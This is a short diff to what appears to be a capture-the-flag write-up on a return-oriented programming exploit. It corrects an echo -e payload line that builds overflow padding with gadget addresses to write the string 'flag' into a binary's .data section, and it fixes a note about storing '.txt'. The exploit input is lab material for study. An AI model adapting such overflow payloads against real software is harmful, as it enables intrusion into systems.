@@ -241,7 +241,7 @@ I set this up in a .txt file using "echo -e"... This helps me have more granular
 
 Me using echo -e:
 
-	$ echo -e "`python3 -c "print('a'*40+'b'*4)"`\xaa\x85\x04\x08\x18\xa0\x04\x08galf\x43\x85\x04\x08cccc" > input
+	$ echo -e "`python3 -c "print('a'*40+'b'*4)"`\xaa\x85\x04\x08\x18\xa0\x04\x08flag\x43\x85\x04\x08cccc" > input
 
 
 Let's run it in gdb and see if our values are correct:
@@ -259,7 +259,7 @@ Okay, so this worked pretty nicely :) we now have "flag" stored at .data (0x0804
 
 # Stack 2 - Storing the Entire String in Memory
 
-Now, we need to get "txt." into .data+0x4 (0x0804a01c)
+Now, we need to get ".txt" into .data+0x4 (0x0804a01c)
 Can we use the same ROP gadgets??
 
 	A's                                     40B
